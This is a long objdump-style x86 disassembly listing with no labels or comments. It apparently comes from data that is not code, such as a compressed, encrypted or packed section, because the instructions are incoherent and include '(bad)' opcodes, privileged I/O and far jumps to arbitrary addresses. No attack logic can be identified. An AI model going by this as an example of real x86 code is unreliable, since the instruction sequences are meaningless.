  416cec:	and    BYTE PTR [esi],bh
  416cee:	adc    bh,BYTE PTR [ecx+0x5f]
  416cf1:	push   ds
  416cf2:	jg     0x416d43
  416cf4:	aam    0x87
  416cf6:	jg     0x416d2e
  416cf8:	test   BYTE PTR [edx+ebx*8+0x79],dl
  416cfc:	sbb    BYTE PTR [ebp+0x22bbdb57],al
  416d02:	mov    esp,0x3a375eb4
  416d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d08:	xchg   edx,eax
  416d09:	or     edx,DWORD PTR [ebp+0x61275589]
  416d0f:	mov    dl,0x86
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	jle    0x416d0a
  416d82:	loope  0x416d22
  416d84:	ja     0x416d77
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0xb4000001
  416d8d:	push   esp
  416d8e:	sahf   
  416d8f:	int    0xe
  416d91:	cli    
  416d92:	bnd ret 
  416d94:	lds    eax,FWORD PTR [edx-0x4b]
  416d97:	lock bound esi,QWORD PTR [ebx]
  416d9a:	add    edx,DWORD PTR [ebp+0x33544072]
  416da0:	fs lahf 
  416da2:	push   ecx
  416da3:	or     DWORD PTR [ecx-0x3691c522],edi
  416da9:	xchg   edx,eax
  416daa:	and    ch,BYTE PTR [esi+0x6848a599]
  416db0:	jmp    0x416d86
  416db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416db3:	dec    ecx
  416db4:	stos   DWORD PTR es:[edi],eax
  416db5:	mov    WORD PTR gs:[edi],es
  416db8:	xor    bh,ch
  416dba:	pusha  
  416dbb:	xchg   DWORD PTR [edx+0x5dfaac6d],eax
  416dc1:	mov    ecx,0xfbc852a8
  416dc6:	xchg   edx,eax
  416dc7:	adc    esi,ebx
  416dc9:	repz pusha 
  416dcb:	sub    BYTE PTR [ebx-0x44],bh
  416dce:	jo     0x416dbf
  416dd0:	out    dx,eax
  416dd1:	fnstenv [eax+0x7f]
  416dd4:	cmp    al,0xac
  416dd6:	mov    WORD PTR [edi-0x2bcc61bd],?
  416ddc:	xchg   edi,eax
  416ddd:	out    dx,al
  416dde:	cs jmp 0x1925396c
  416de4:	xor    al,0xac
  416de6:	mul    esi
  416de8:	xor    BYTE PTR [edx+0x23],bl
  416deb:	add    eax,0xfa03c8af
  416df0:	dec    edx
  416df1:	daa    
  416df2:	mov    ebp,0xa3a32972
  416df7:	lods   al,BYTE PTR ds:[esi]
  416df8:	fmul   QWORD PTR [eax+0xf]
  416dfb:	iret   
  416dfc:	sbb    esi,0xfffffff0
  416dff:	xchg   esp,eax
  416e00:	fldenv [edi]
  416e02:	pushf  
  416e03:	imul   ebx,ecx,0xfffffffb
  416e06:	push   ebp
  416e07:	cmp    eax,0x39a9bff
  416e0c:	pop    ecx
  416e0d:	mov    edi,0x985a84be
  416e12:	idiv   esp
  416e14:	repz add BYTE PTR [ebp-0x1ef363a9],ah
  416e1b:	fdiv   DWORD PTR [eax]
  416e1d:	stos   BYTE PTR es:[edi],al
  416e1e:	xlat   BYTE PTR ds:[ebx]
  416e1f:	aad    0x6b
  416e21:	retf   
  416e22:	adc    BYTE PTR ds:0x2e71338d,bl
  416e28:	into   
  416e29:	mov    esp,0xbbb5fd86
  416e2e:	shl    cl,0x3
  416e31:	xor    eax,0xdb2b943
  416e36:	ss push cs
  416e38:	mov    esp,0xb9cc9cab
  416e3d:	les    esp,FWORD PTR [di+0x18]
  416e41:	cwde   
  416e42:	sub    eax,0x41777067
  416e47:	outs   dx,DWORD PTR ds:[esi]
  416e48:	dec    ebp
  416e49:	mov    BYTE PTR [eax+0x50],cl
  416e4c:	sub    bl,BYTE PTR [esi-0x768fa5b7]
  416e52:	cli    
  416e53:	loopne 0x416df8
  416e55:	inc    edi
  416e56:	xchg   ebp,eax
  416e57:	ret    
  416e58:	pop    ebp
  416e59:	dec    ecx
  416e5a:	in     eax,0x2b
  416e5c:	xor    cl,BYTE PTR [ebx]
  416e5e:	sbb    DWORD PTR [edi-0x751116ab],ecx
  416e64:	push   esp
  416e65:	mov    ds:0xa7fdda1b,eax
  416e6a:	lea    ebx,[edi+edx*2+0x3c]
  416e6e:	mov    ebx,0x7f5e3bfa
  416e73:	add    ch,BYTE PTR [ebx-0x2f]
  416e76:	sub    bl,BYTE PTR [eax]
  416e78:	div    BYTE PTR [eax-0x5e]
  416e7b:	mov    eax,ecx
  416e7d:	repz cs cmp eax,0xf4c9e86c
  416e84:	add    al,BYTE PTR [edi*2-0x39808995]
  416e8b:	call   0xc0:0x2e990
	...
  416ef2:	add    BYTE PTR [eax],al
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x73d98eea
  416f02:	nop
  416f03:	stc    
  416f04:	jl     0x416ef8
  416f06:	add    BYTE PTR [eax],al
  416f08:	add    eax,0xfa000001
  416f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f0e:	shl    BYTE PTR [edi-0x4d],1
  416f11:	mov    cl,0x2e
  416f13:	pop    eax
  416f14:	sar    BYTE PTR [edx],0x8e
  416f17:	pop    edi
  416f18:	ficom  WORD PTR [ecx]
  416f1a:	and    eax,0x491fc7a3
  416f1f:	push   es
  416f20:	mov    ecx,0xef31ad84
  416f25:	out    dx,al
  416f26:	ret    0xf63d
  416f29:	popf   
  416f2a:	pop    ds
  416f2b:	popf   
  416f2c:	fwait
  416f2d:	add    eax,0xfe79aaa8
  416f32:	fldcw  WORD PTR [esi-0x6f4d97fd]
  416f38:	gs iret 
  416f3a:	lahf   
  416f3b:	pop    es
  416f3c:	int    0xd9
  416f3e:	sar    BYTE PTR [ecx+0x49],cl
  416f41:	scas   eax,DWORD PTR es:[edi]
  416f42:	test   edi,0x9c683576
  416f48:	and    eax,0xc18a9e02
  416f4d:	dec    edx
  416f4e:	imul   eax
  416f50:	fild   DWORD PTR [ebp-0x3d0f15f2]
  416f56:	push   edi
  416f57:	mov    bl,0xf
  416f59:	aam    0x24
  416f5b:	and    BYTE PTR [ebx+0x60a4bcf0],cl
  416f61:	jmp    0x45f09296
  416f66:	and    esp,DWORD PTR [ecx+eax*8]
  416f69:	rcr    DWORD PTR gs:[ebx-0x37adce4c],cl
  416f70:	xchg   edx,eax
  416f71:	or     edi,DWORD PTR [edi-0x51]
  416f74:	mov    al,0x4c
  416f76:	pop    ebp
  416f77:	outs   dx,DWORD PTR ds:[esi]
  416f78:	xor    BYTE PTR [edi],0x82
  416f7b:	dec    ecx
  416f7c:	test   DWORD PTR [eax-0x18],eax
  416f7f:	pop    ebx
  416f80:	(bad)  
  416f81:	out    dx,eax
  416f82:	cmp    ebp,DWORD PTR ds:0xcad2b211
  416f88:	inc    DWORD PTR [esi-0x1ad7e84d]
  416f8e:	adc    esi,DWORD PTR [ebx]
  416f90:	inc    ebp
  416f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f92:	stos   BYTE PTR es:[edi],al
  416f93:	xor    DWORD PTR fs:[edx+0x28],0x3b386082
  416f9b:	cld    
  416f9c:	aaa    
  416f9d:	in     al,dx
  416f9e:	mov    ecx,0xd282db9
  416fa3:	cmp    edi,ebx
  416fa5:	sbb    dh,BYTE PTR [edx]
  416fa7:	xchg   ebx,eax
  416fa8:	jecxz  0x416f4a
  416faa:	sbb    esi,DWORD PTR [ebx+0x29]
  416fad:	cmp    ebx,ebp
  416faf:	jns    0x416fa8
  416fb1:	lods   eax,DWORD PTR ds:[esi]
  416fb2:	dec    eax
  416fb3:	push   ecx
  416fb4:	mov    esp,0x14993c53
  416fb9:	mov    ds:0xdfe6a539,eax
  416fbe:	jne    0x416fb1
  416fc0:	cmp    eax,0x6e16e716
  416fc5:	sbb    al,0x36
  416fc7:	mov    es:0x5bf1b133,eax
  416fcd:	call   FWORD PTR ds:0xe8bbdd8
  416fd3:	dec    eax
  416fd4:	clc    
  416fd5:	adc    esi,esi
  416fd7:	or     eax,0x84a3e044
  416fdc:	push   edx
  416fdd:	push   es
  416fde:	mov    ah,0x1c
  416fe0:	adc    al,0x78
  416fe2:	mov    edx,0xa0887e70
  416fe7:	push   es
  416fe8:	(bad)  
  416fea:	and    al,al
  416fec:	clc    
  416fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fee:	cmp    BYTE PTR [edx],ah
  416ff0:	dec    esp
  416ff1:	xchg   ebx,eax
  416ff2:	sbb    eax,0x15dcab33
  416ff7:	adc    eax,0x6ae8623e
  416ffc:	rcl    ah,0xec
  416fff:	or     BYTE PTR [ebx-0x1bc4a49f],bh
  417005:	cmp    esp,DWORD PTR [esi+0x8]
  417008:	dec    ecx
  417009:	sub    al,0x4e
  41700b:	test   ecx,ecx
  41700d:	repnz aam 0x26
  417010:	push   esp
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ebx,DWORD PTR [ebp+0x24]
  417082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417083:	xor    DWORD PTR [ecx+0x50000f3],eax
  417089:	add    DWORD PTR [eax],eax
  41708b:	add    BYTE PTR [ebx+eax*8+0x1b0df83f],ah
  417092:	xchg   DWORD PTR [eax+ebx*4+0x1e9ac609],esi
  417099:	cli    
  41709a:	fidiv  DWORD PTR [edx]
  41709c:	inc    edi
  41709d:	mov    ecx,DWORD PTR [eax+0x3f]
  4170a0:	mov    dl,0xa
  4170a2:	inc    edx
  4170a3:	pop    ss
  4170a4:	std    
  4170a5:	sbb    al,dl
  4170a7:	push   ss
  4170a8:	jbe    0x4170bc
  4170aa:	movzx  eax,WORD PTR [esi+0xd701141]
  4170b1:	cdq    
  4170b2:	ds std 
  4170b4:	jae    0x4170b6
  4170b6:	pop    es
  4170b7:	adc    BYTE PTR [eax],bh
  4170b9:	cmc    
  4170ba:	pop    esi
  4170bb:	jge    0x4170f1
  4170bd:	add    esp,ebp
  4170bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c0:	sub    DWORD PTR [esi+0x56517557],edi
  4170c6:	push   0xc1fd0bd4
  4170cb:	or     esp,DWORD PTR [edi+0x7321213e]
  4170d1:	adc    al,0xdb
  4170d3:	rcr    edx,1
  4170d5:	mov    al,ds:0xcf08424b
  4170da:	je     0x4170e8
  4170dc:	repnz cmp bh,BYTE PTR [ecx]
  4170df:	sbb    al,0xf6
  4170e1:	bound  ebx,QWORD PTR [ebx]
  4170e3:	pusha  
  4170e4:	mov    bl,0x77
  4170e6:	imul   cl
  4170e8:	sub    al,0x5a
  4170ea:	shl    BYTE PTR [ebx],cl
  4170ec:	fmul   DWORD PTR [ebx+0x54]
  4170ef:	lea    ecx,[eax-0x3ac1bc70]
  4170f5:	xchg   ebx,eax
  4170f6:	pop    ss
  4170f7:	push   edx
  4170f8:	lods   eax,DWORD PTR ds:[esi]
  4170f9:	jbe    0x417121
  4170fb:	xor    ch,BYTE PTR [ebp-0x1c]
  4170fe:	dec    edx
  4170ff:	fs ret 
  417101:	inc    edx
  417102:	mov    WORD PTR [ebx],ss
  417104:	mov    ds,edx
  417106:	iret   
  417107:	test   DWORD PTR [ecx+0x52],ebp
  41710a:	or     cl,BYTE PTR [edi+0x2f]
  41710d:	mov    ds:0xc06ad9d6,eax
  417112:	call   0xbc62:0x170c200
  417119:	retf   0x49b7
  41711c:	ror    DWORD PTR [eax-0x65],cl
  41711f:	xchg   ebx,eax
  417120:	repnz hlt 
  417122:	and    BYTE PTR [ebx],cl
  417124:	pop    edx
  417125:	or     al,dl
  417127:	push   cs
  417128:	fwait
  417129:	cmp    DWORD PTR [eax],edi
  41712b:	ret    
  41712c:	arpl   WORD PTR [esi+0x5c8ca5cf],sp
  417132:	ret    0x4f06
  417135:	xchg   edx,eax
  417136:	cmc    
  417137:	and    al,0xf2
  417139:	ss jae 0x417117
  41713c:	adc    ebx,DWORD PTR [edx]
  41713e:	dec    edi
  41713f:	scas   eax,DWORD PTR es:[edi]
  417140:	(bad)  
  417141:	sub    al,al
  417143:	(bad)  
  417144:	mov    ebx,0xb583cb0a
  417149:	push   edx
  41714a:	dec    esp
  41714b:	push   ecx
  41714c:	pusha  
  41714d:	and    ebp,0x11
  417150:	xlat   BYTE PTR ds:[ebx]
  417151:	sub    al,0x9e
  417153:	or     bl,BYTE PTR fs:[edx]
  417156:	int    0x58
  417158:	sahf   
  417159:	neg    DWORD PTR [esi+0x50]
  41715c:	cmp    esp,ebp
  41715e:	mov    ch,0x2d
  417160:	imul   DWORD PTR [eax+0x65]
  417163:	xor    dl,dl
  417165:	jmp    0x417175
  417167:	sub    DWORD PTR [ebx+ecx*2-0x47446673],ebx
  41716e:	je     0x4170fb
  417170:	xor    ebx,ebx
  417172:	mov    bh,0xf8
  417174:	ins    DWORD PTR es:[edi],dx
  417175:	add    ecx,DWORD PTR [ebx-0x16a2f388]
  41717b:	mov    esi,0xe08ee34e
  417180:	mov    eax,ds:0x14fcda0e
  417185:	cwde   
  417186:	jge    0x41711f
  417188:	lods   eax,DWORD PTR ds:[esi]
  417189:	fld    QWORD PTR [ebp-0x322af41f]
  41718f:	shl    BYTE PTR [edx+0x0],0x0
	...
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	jns    0x41718d
  417202:	and    al,0x20
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0x2f000001
  41720d:	and    ah,cl
  41720f:	cmp    eax,0x6b26b302
  417214:	in     eax,0x39
  417216:	adc    eax,0xedf8b0a6
  41721b:	xchg   BYTE PTR [edx-0x522b4c88],dl
  417221:	aad    0xe
  417223:	jge    0x41725f
  417225:	pop    ds
  417226:	xor    dh,dh
  417228:	or     al,0xb8
  41722a:	sbb    eax,0x2ec5b2a1
  41722f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417230:	or     esi,DWORD PTR [eax+0x4114305b]
  417236:	jl     0xa3f863d3
  41723c:	jno    0x4172b0
  41723e:	aam    0x54
  417240:	or     BYTE PTR [ecx+ebx*8-0x5132ec6f],0xda
  417248:	or     DWORD PTR [edx+0x1e0d5217],ecx
  41724e:	(bad)  
  41724f:	cmp    DWORD PTR [eax+0x2fe10e6a],eax
  417255:	lea    esi,[ebx-0x35b87567]
  41725b:	fstp   DWORD PTR [ebx+0x5cd4cfcf]
  417261:	ror    BYTE PTR [edx+0x31],1
  417264:	les    ebp,FWORD PTR ds:0xb89fe5fd
  41726a:	in     al,dx
  41726b:	push   cs
  41726c:	push   ebp
  41726d:	cmp    DWORD PTR ds:0xaf606f8e,ecx
  417273:	clc    
  417274:	pushf  
  417275:	lahf   
  417276:	xor    ebp,DWORD PTR [eax+0x2128984d]
  41727c:	add    bl,BYTE PTR [eax+0x1f]
  41727f:	cmp    eax,0x50249372
  417284:	jecxz  0x4172d3
  417286:	mov    esi,0xec960e83
  41728b:	xchg   DWORD PTR ds:0xc525ddbc,ebx
  417291:	gs dec esp
  417293:	imul   BYTE PTR [ebp+0x3a]
  417296:	test   eax,0x6ce91028
  41729b:	dec    esi
  41729c:	call   FWORD PTR [ecx+0x1e2243d4]
  4172a2:	dec    esp
  4172a3:	(bad)  
  4172a4:	sti    
  4172a5:	pop    ebp
  4172a6:	or     al,BYTE PTR [esi-0x44b446ec]
  4172ac:	sub    DWORD PTR [ecx-0x27ac658a],ebx
  4172b2:	lods   al,BYTE PTR ds:[esi]
  4172b3:	inc    esp
  4172b5:	in     eax,0x22
  4172b7:	jge    0x417334
  4172b9:	pop    esp
  4172ba:	cmp    bl,BYTE PTR gs:[ecx+ebx*2-0x50]
  4172bf:	pop    esp
  4172c0:	sbb    bh,BYTE PTR [ebx-0x76]
  4172c3:	inc    edx
  4172c4:	xchg   edx,eax
  4172c5:	adc    DWORD PTR [esi+eiz*2],eax
  4172c8:	mov    ebp,0xdb5cbef8
  4172cd:	jle    0x4172cb
  4172cf:	mul    al
  4172d1:	loope  0x41731e
  4172d3:	pushf  
  4172d4:	jle    0x417282
  4172d6:	inc    eax
  4172d7:	ror    DWORD PTR [esi+0x61],1
  4172da:	sbb    al,0xbf
  4172dc:	add    DWORD PTR [edx-0x63c2808d],0x36780c32
  4172e6:	stos   DWORD PTR es:[edi],eax
  4172e7:	jg     0x4172be
  4172e9:	xor    esi,edx
  4172eb:	(bad)  
  4172ec:	xchg   esp,eax
  4172ed:	sub    dl,bl
  4172ef:	(bad)  
  4172f0:	jns    0x417306
  4172f2:	jecxz  0x417337
  4172f4:	and    eax,0xa47ea1ef
  4172f9:	push   ss
  4172fa:	mov    dl,0xab
  4172fc:	sub    eax,0x49b7ad8e
  417301:	clc    
  417302:	mov    al,0x82
  417304:	inc    ebp
  417305:	xrelease mov BYTE PTR [esi+0x38],ch
  417309:	mov    ds:0x929b7bf,eax
  41730e:	sub    edi,DWORD PTR [ebx+0x56]
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs pop eax
  417381:	sahf   
  417382:	mov    ah,0x30
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x9000001
  41738d:	in     eax,0xbb
  41738f:	pop    ecx
  417390:	popf   
  417391:	and    eax,0x10b107a1
  417396:	pop    ebp
  417397:	jbe    0x4173a0
  417399:	test   BYTE PTR [edx],al
  41739b:	das    
  41739c:	xchg   eax,esi
  41739e:	pushf  
  41739f:	fimul  WORD PTR [eax-0xc]
  4173a2:	dec    edx
  4173a3:	test   ebp,eax
  4173a5:	pusha  
  4173a6:	mov    ?,WORD PTR [edi-0x7]
  4173a9:	cmc    
  4173aa:	aaa    
  4173ab:	mov    eax,0xb0d1d3c1
  4173b0:	in     eax,dx
  4173b1:	sahf   
  4173b2:	aaa    
  4173b3:	sar    BYTE PTR [esi-0x399176c7],cl
  4173b9:	lahf   
  4173ba:	add    al,0xe
  4173bc:	xor    bh,bh
  4173be:	dec    esp
  4173bf:	sub    eax,0xc0280ce6
  4173c4:	xor    eax,0x384116c1
  4173c9:	cmp    al,0x92
  4173cb:	cmc    
  4173cc:	stos   BYTE PTR es:[edi],al
  4173cd:	dec    BYTE PTR [eax+0x50]
  4173d0:	je     0x41737d
  4173d2:	xor    eax,0xd2163e52
  4173d7:	cwde   
  4173d8:	(bad)  
  4173d9:	mov    ebx,0x680d0854
  4173de:	cdq    
  4173df:	inc    esi
  4173e0:	push   ecx
  4173e1:	mov    bl,0x99
  4173e3:	pop    ebx
  4173e4:	loop   0x417456
  4173e6:	mov    esi,esp
  4173e8:	xchg   ebx,eax
  4173e9:	neg    BYTE PTR [esi+ecx*8-0x35]
  4173ed:	xchg   ebx,eax
  4173ee:	xchg   edi,eax
  4173ef:	cmp    eax,0xa2efee63
  4173f4:	sub    dl,BYTE PTR [esi-0x52dde471]
  4173fa:	mov    ecx,0x5de84a21
  4173ff:	in     al,0x51
  417401:	hlt    
  417402:	jae    0x417474
  417404:	ds and al,0x36
  417407:	xchg   edi,eax
  417408:	sbb    al,0xde
  41740a:	push   edi
  41740b:	push   0x423cb553
  417410:	das    
  417411:	lea    esp,[ebx]
  417413:	iret   
  417414:	inc    edx
  417415:	pop    ss
  417416:	sbb    eax,0xbfc8e10c
  41741b:	add    ebp,DWORD PTR [ebx+0x1cbb8723]
  417421:	and    ebx,DWORD PTR [edx-0x1d]
  417424:	mov    ecx,0x6d8bc770
  417429:	xor    eax,0x7200fe2c
  41742e:	cmp    edx,DWORD PTR [eax]
  417430:	push   edi
  417431:	mov    ds:0x42a501b,eax
  417436:	inc    edx
  417437:	cmp    DWORD PTR [esi-0x8a1879a],ebx
  41743d:	mov    ebx,0x3d7652b3
  417442:	mov    eax,0x9f92cf4c
  417447:	push   ebx
  417448:	popf   
  417449:	add    edi,DWORD PTR [edi+0x22b85863]
  41744f:	push   esi
  417450:	fisttp DWORD PTR [ecx+0x4f]
  417453:	ds rol dl,1
  417456:	adc    BYTE PTR [edx],bh
  417458:	int3   
  417459:	call   0x7a23:0xa9730b41
  417460:	outs   dx,DWORD PTR ds:[esi]
  417461:	sti    
  417462:	push   ecx
  417463:	mov    WORD PTR [ebx-0x36],fs
  417466:	retf   
  417467:	mov    al,ds:0x94406567
  41746c:	mov    gs,WORD PTR [eax]
  41746e:	or     al,0x62
  417470:	stos   DWORD PTR es:[edi],eax
  417471:	mov    bh,0x73
  417473:	mov    bh,0xc2
  417475:	daa    
  417476:	icebp  
  417477:	stos   DWORD PTR es:[edi],eax
  417478:	adc    dh,0xbf
  41747b:	icebp  
  41747c:	fidiv  DWORD PTR [edi+edx*1]
  41747f:	in     eax,0x8d
  417481:	(bad)
  417484:	loope  0x417460
  417486:	ss dec ebp
  417488:	std    
  417489:	sbb    bl,BYTE PTR [ebx-0x5e32077e]
  41748f:	daa    
  417490:	mov    ah,0x0
	...
  4174f2:	add    BYTE PTR [eax],al
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	inc    edx
  417501:	sar    BYTE PTR [edx],0x6d
  417504:	nop
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0x80000001
  41750d:	into   
  41750e:	mov    cs,esi
  417510:	loope  0x417520
  417512:	es push 0xffffffef
  417515:	cld    
  417516:	call   0x34901957
  41751b:	aad    0x8b
  41751d:	inc    ebp
  41751e:	mov    DWORD PTR [ebx-0x35],ebp
  417521:	mov    al,0x55
  417523:	mov    edx,ds
  417525:	in     eax,dx
  417526:	sub    dh,BYTE PTR [ecx+0x5de4459e]
  41752c:	xchg   edx,eax
  41752d:	push   edx
  41752e:	in     eax,0x14
  417530:	or     al,0xe7
  417532:	xor    ebp,eax
  417534:	dec    edi
  417535:	pop    ecx
  417536:	(bad)  
  417537:	jns    0x4174cd
  417539:	and    BYTE PTR [eax],ah
  41753b:	push   esp
  41753c:	dec    ebp
  41753d:	out    dx,eax
  41753e:	mov    bl,0xb1
  417540:	xchg   edi,eax
  417541:	dec    esp
  417542:	mov    eax,DWORD PTR gs:[ebp+0x22edc307]
  417549:	cmp    al,0x6c
  41754b:	daa    
  41754c:	mov    ?,WORD PTR [ecx-0x13c8f28e]
  417552:	add    ecx,DWORD PTR [ecx+0xe]
  417555:	or     al,ah
  417557:	cdq    
  417558:	pop    es
  417559:	xor    BYTE PTR [ebx+0x6],0xf7
  41755d:	xchg   ebp,eax
  41755e:	ds cmp al,0x33
  417561:	mov    eax,0xd4c14d9d
  417566:	test   al,0xd5
  417568:	shr    DWORD PTR [ebp-0x64],1
  41756b:	sub    DWORD PTR [ecx],0x39
  41756e:	stos   DWORD PTR es:[edi],eax
  41756f:	call   0x9a5:0xb3355dca
  417576:	imul   esp,edx,0x16a4e185
  41757c:	mov    ds:0x1228a61e,eax
  417581:	add    eax,0xaddc8902
  417586:	or     DWORD PTR [edi+eiz*2+0x5a857580],ebx
  41758d:	(bad)  
  41758f:	push   edx
  417590:	adc    ebp,DWORD PTR [eax]
  417592:	add    esi,DWORD PTR [edx+0x4]
  417595:	xchg   esp,eax
  417596:	test   BYTE PTR [edx-0x29],bh
  417599:	(bad)  
  41759b:	rcr    BYTE PTR [esi],cl
  41759d:	push   ecx
  41759e:	mov    ds:0x60d1c8e4,al
  4175a3:	jmp    0xc399:0x886b5fce
  4175aa:	pop    ds
  4175ab:	or     ecx,eax
  4175ad:	pop    edx
  4175ae:	sub    DWORD PTR [edi+ebp*8+0x132cb35c],ecx
  4175b5:	inc    ebx
  4175b6:	lods   eax,DWORD PTR ds:[esi]
  4175b7:	pop    ecx
  4175b8:	es push cs
  4175ba:	in     al,dx
  4175bb:	mov    bl,0x6c
  4175bd:	les    ecx,FWORD PTR [edx+0x5bdc34ac]
  4175c3:	pop    ss
  4175c4:	int    0x54
  4175c6:	mov    DWORD PTR [ecx],esp
  4175c8:	or     BYTE PTR [ebp-0x53],bl
  4175cb:	cli    
  4175cc:	dec    ebx
  4175cd:	and    eax,0x5c7bdd7f
  4175d2:	xlat   BYTE PTR ds:[ebx]
  4175d3:	mov    ds:0x24a136e7,eax
  4175d8:	mov    ebp,ds
  4175da:	push   edi
  4175db:	mov    edi,0x1e37750d
  4175e0:	data16 fsubr QWORD PTR [eax-0x29]
  4175e4:	pop    esi
  4175e5:	adc    BYTE PTR [edx-0x74],dh
  4175e8:	jmp    0x417616
  4175ea:	fdiv   st(6),st
  4175ec:	xor    DWORD PTR [edi-0xa259f3d],ecx
  4175f2:	cmp    BYTE PTR [edx-0x20],dl
  4175f5:	add    al,0x58
  4175f7:	push   cs
  4175f8:	bound  ecx,QWORD PTR [eax+0x53815fe2]
  4175fe:	(bad)  [edi+0x3c]
  417601:	dec    esi
  417602:	cmp    BYTE PTR ss:[esp+esi*2+0x50],al
  417607:	out    0x2e,al
  417609:	and    al,0xb5
  41760b:	sahf   
  41760c:	(bad)  
  41760d:	inc    eax
  41760e:	popf   
  41760f:	xchg   edi,eax
  417610:	fiadd  WORD PTR [eax]
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fcmovu st,st(5)
  417681:	arpl   WORD PTR [esi+0x3],di
  417684:	xchg   ebp,eax
  417685:	test   DWORD PTR [eax],0x10500
  41768b:	add    BYTE PTR [ecx],cl
  41768d:	fidiv  DWORD PTR [esi+edx*2-0x29]
  417691:	jge    0x4176f7
  417693:	sub    al,0xef
  417695:	clc    
  417696:	gs retf 0xb452
  41769a:	sahf   
  41769b:	add    al,0x5d
  41769d:	xor    DWORD PTR [esi+0x44f98f0f],ecx
  4176a3:	dec    edx
  4176a4:	xor    ebp,DWORD PTR [esi-0x1e]
  4176a7:	xor    DWORD PTR [edi],0x43
  4176aa:	mov    cl,0xe3
  4176ac:	inc    eax
  4176ad:	mov    ebp,DWORD PTR [esi+0x6751b2a]
  4176b3:	pop    edx
  4176b4:	sahf   
  4176b5:	jo     0x41772c
  4176b7:	(bad)  
  4176b8:	push   ss
  4176b9:	mov    dl,0x1c
  4176bb:	imul   edi,DWORD PTR [eax+edx*1-0x31],0xb7d4ded8
  4176c3:	daa    
  4176c4:	js     0x41773d
  4176c6:	icebp  
  4176c7:	test   dh,bl
  4176c9:	xor    al,0x90
  4176cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176cc:	jno    0x41768c
  4176ce:	pushf  
  4176cf:	ret    0x38a7
  4176d2:	pop    edx
  4176d3:	mov    ds,WORD PTR [ecx]
  4176d5:	inc    edx
  4176d6:	inc    edi
  4176d7:	and    eax,0x615c385c
  4176dc:	in     eax,dx
  4176dd:	arpl   WORD PTR [edi+eax*2],dx
  4176e0:	test   al,0x61
  4176e2:	dec    ebp
  4176e3:	inc    edx
  4176e4:	sub    cl,cl
  4176e6:	add    al,0x2
  4176e8:	dec    ecx
  4176e9:	fdiv   QWORD PTR [ebx+0x6bb5381f]
  4176ef:	shl    DWORD PTR [ebp-0x1096df73],0x78
  4176f6:	xor    eax,0x9fab9a2
  4176fb:	xchg   esp,eax
  4176fc:	ret    
  4176fd:	sahf   
  4176fe:	xchg   ebx,eax
  4176ff:	mov    cl,0x65
  417701:	dec    edi
  417702:	xchg   esp,eax
  417703:	inc    ebp
  417704:	pop    esi
  417705:	icebp  
  417706:	mov    bh,0xe0
  417708:	mov    esp,0xe1cedd4e
  41770d:	add    al,0xf5
  41770f:	repz fs push edi
  417712:	loopne 0x417743
  417714:	jne    0x4176c0
  417716:	or     DWORD PTR [esi-0x20],edx
  417719:	pop    ebp
  41771a:	xlat   BYTE PTR ds:[ebx]
  41771b:	pop    edx
  41771c:	push   edi
  41771d:	add    bh,BYTE PTR [esi+0xcafa3ff]
  417723:	add    eax,0x5854c392
  417728:	inc    eax
  417729:	arpl   WORD PTR cs:[ebp-0x4ceffa2e],di
  417730:	bound  eax,QWORD PTR [ebx-0x1d]
  417733:	call   0xb7ed6878
  417738:	jnp    0x4176fd
  41773a:	xor    edx,DWORD PTR [ebx+0x1d]
  41773d:	inc    esp
  41773e:	mov    ebx,cs
  417740:	push   ebx
  417741:	es aas 
  417743:	inc    ecx
  417744:	fist   DWORD PTR [ebx]
  417746:	movaps XMMWORD PTR [ebp+0x47],xmm4
  41774a:	fidivr DWORD PTR [edi]
  41774c:	fimul  DWORD PTR ss:[eax-0x1f66e7d8]
  417753:	add    DWORD PTR [edi+ecx*4-0x401e0800],eax
  41775a:	sub    BYTE PTR [esi],dh
  41775c:	(bad)  [edx-0x4c40da3d]
  417762:	ja     0x4177c1
  417764:	ret    
  417765:	jae    0x417702
  417767:	adc    ebp,eax
  417769:	idiv   BYTE PTR [esi+0x53]
  41776c:	aam    0x30
  41776e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41776f:	inc    edi
  417770:	add    esp,eax
  417772:	dec    edi
  417773:	mov    ebx,DWORD PTR [edx+0x1]
  417776:	iret   
  417777:	loopne 0x417720
  417779:	and    BYTE PTR [edi],al
  41777b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41777c:	mov    bl,0xd4
  41777e:	mov    ebx,0x38249750
  417783:	arpl   WORD PTR [edx-0x72],dx
